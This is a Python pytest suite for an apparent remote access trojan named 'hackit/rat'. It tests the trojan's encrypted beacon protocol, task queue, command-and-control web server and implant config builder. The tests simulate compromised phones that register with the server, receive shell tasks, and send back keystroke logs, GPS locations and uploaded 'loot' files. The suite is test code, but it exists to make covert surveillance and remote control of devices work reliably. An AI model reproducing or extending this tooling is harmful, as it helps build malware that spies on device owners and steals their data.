"""Offline tests for the rat protocol, store and C2 surface.

Run with ``python3 -m pytest hackit/rat/tests -q``. The aiohttp app is driven
through a real loopback socket (TestServer) so routing, auth and body limits
are exercised the same way a device would.
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import secrets

import pytest
from aiohttp import ClientSession
from aiohttp.test_utils import TestServer

from hackit.rat import builder, protocol, server, store


@pytest.fixture()
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HACKIT_RAT_HOME", str(tmp_path))
    monkeypatch.setattr(store, "ROOT", str(tmp_path))
    monkeypatch.setattr(store, "DB_PATH", str(tmp_path / "rat.db"))
    monkeypatch.setattr(store, "FILES_DIR", str(tmp_path / "loot"))
    monkeypatch.setattr(store, "_ready", False)
    store.init()
    yield tmp_path


@pytest.fixture()
def psk():
    return secrets.token_bytes(32)


def _sealed(psk: bytes, sid: str, body: dict) -> bytes:
    return json.dumps(protocol.seal(psk, sid, protocol.pack(body))).encode()


def _open(psk: bytes, raw: bytes) -> dict:
    return json.loads(protocol.open_envelope(psk, raw)["body"])


class Client:
    def __init__(self, http: ClientSession, base: str, psk: bytes, sid: str) -> None:
        self.http = http
        self.base = base.rstrip("/")
        self.psk = psk
        self.sid = sid

    async def beacon(self, body: dict) -> dict:
        response = await self.http.post(self.base + "/v1/beacon", data=_sealed(self.psk, self.sid, body))
        assert response.status == 200, await response.text()
        return _open(self.psk, await response.read())

    async def api(self, method: str, path: str, token: str = "tok", **kwargs):
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        return await self.http.request(method, self.base + path, headers=headers, **kwargs)


@pytest.fixture()
def app(home, psk):
    hub = server.Hub(psk=psk, token="tok", public_url="http://test")
    return server.make_app(hub)


def run(coro):
    return asyncio.get_event_loop_policy().new_event_loop().run_until_complete(coro)


def test_hkdf_labels_differ(psk):
    assert protocol.aes_key(psk) != protocol.mac_key(psk)
    assert len(protocol.aes_key(psk)) == 32


def test_envelope_roundtrip(psk):
    env = protocol.seal(psk, "s", b'{"op":"poll"}')
    opened = protocol.open_envelope(psk, json.dumps(env).encode())
    assert opened["body"] == b'{"op":"poll"}'


@pytest.mark.parametrize("field", ["sid", "n", "c", "h"])
def test_tamper_rejected(psk, field):
    env = protocol.seal(psk, "s", b"{}")
    env[field] = "00" + env[field][2:]
    with pytest.raises(protocol.ProtocolError):
        protocol.open_envelope(psk, json.dumps(env).encode())


def test_task_validation():
    with pytest.raises(protocol.ProtocolError):
        protocol.validate_task({"cmd": "nope"})
    with pytest.raises(protocol.ProtocolError):
        protocol.validate_task({"cmd": "shell", "args": ["x"] * 25})
    assert protocol.validate_task({"cmd": "ping"}) == {"cmd": "ping", "args": []}


def test_store_hands_out_once(home):
    store.register("s", {"model": "m"}, "1.2.3.4")
    task_id = store.queue_task("s", "ping")
    assert [t["id"] for t in store.take_tasks("s", 4)] == [task_id]
    assert store.take_tasks("s", 4) == []
    assert store.complete_task(task_id, "s", "pong")
    assert store.task(task_id)["state"] == "done"
    assert not store.complete_task(task_id, "s", "again")


def test_stale_requeue(home):
    store.register("s", {}, "ip")
    task_id = store.queue_task("s", "ping")
    store.take_tasks("s", 1)
    import time

    assert store.requeue_stale(0) == 1
    _ = time
    assert store.task(task_id)["state"] == "queued"


def test_beacon_flow_and_auth(app, psk):
    async def scenario():
        async with TestServer(app) as server_:
            async with ClientSession() as http:
                client = Client(http, str(server_.make_url("/")), psk, "sid-1")
                reply = await client.beacon({"op": "register", "meta": {"model": "Pixel", "sdk": 34}})
                assert reply["ok"] and reply["tasks"] == []

                response = await client.api("POST", "/api/task/sid-1", json={"cmd": "shell", "args": ["id"]})
                assert response.status == 200
                task = (await (await client.api("POST", "/api/task/sid-1",
                                                json={"cmd": "info"})).json())["id"]

                reply = await client.beacon({"op": "poll", "wanted": 4})
                ids = [t["id"] for t in reply["tasks"]]
                assert task in ids

                reply = await client.beacon({
                    "op": "poll",
                    "results": [{"id": ids[0], "code": 0, "out": "uid=0"}],
                    "events": [{"kind": "keylog", "data": [{"pkg": "a", "text": "hi"}]},
                               {"kind": "loc", "data": [{"lat": 1.5, "lon": 2.5, "src": "gps"}]}],
                })
                assert reply["ok"]

                detail = await (await client.api("GET", "/api/session/sid-1")).json()
                assert detail["session"]["battery"] == 0
                assert any(t["state"] == "done" for t in detail["tasks"])
                assert detail["keylogs"][0]["text"] == "hi"
                assert detail["locations"][0]["lat"] == 1.5

                assert (await client.api("GET", "/api/session/sid-1", token="bad")).status == 401
                assert (await client.api("GET", "/api/sessions")).status == 200

                bad = protocol.seal(psk, "sid-1", b"{}")
                bad["h"] = "0" * 64
                response = await http.post(str(server_.make_url("/v1/beacon")), data=json.dumps(bad))
                assert response.status == 400

    run(scenario())


def test_upload_download(app, psk):
    async def scenario():
        async with TestServer(app) as server_:
            async with ClientSession() as http:
                client = Client(http, str(server_.make_url("/")), psk, "sid-2")
                await client.beacon({"op": "register"})
                response = await http.post(
                    str(server_.make_url("/v1/upload/sid-2")), data=b"payload",
                    headers={"X-Name": "notes.txt", "X-Kind": "file"},
                )
                assert response.status == 200
                path = (await response.json())["path"]
                token = os.path.basename(path).split("-")[0]
                response = await http.get(str(server_.make_url(f"/v1/download/sid-2/{token}")))
                assert await response.read() == b"payload"
                assert store.loot("sid-2")[0]["name"] == "notes.txt"

                empty = await http.post(str(server_.make_url("/v1/upload/sid-2")), data=b"")
                assert empty.status == 400
                unknown = await http.post(str(server_.make_url("/v1/upload/nope")), data=b"x")
                assert unknown.status == 404

    run(scenario())


def test_unknown_session_reregisters(app, psk):
    async def scenario():
        async with TestServer(app) as server_:
            async with ClientSession() as http:
                client = Client(http, str(server_.make_url("/")), psk, "ghost")
                reply = await client.beacon({"op": "poll", "meta": {"model": "x"}})
                assert reply["ok"]
                assert store.get_session("ghost")["model"] == "x"

    run(scenario())


def test_make_config_validation():
    key = base64.b64encode(b"k" * 32).decode()
    config = builder.make_config("https://c2", key, "lbl", 1, True, "AA:BB")
    assert config["interval"] == 15000
    assert config["pin"] == "aabb"
    with pytest.raises(builder.BuildError):
        builder.make_config("c2.example", key, "x", 60000, False, "")
    with pytest.raises(builder.BuildError):
        builder.make_config("https://c2", base64.b64encode(b"short").decode(), "x", 60000, False, "")
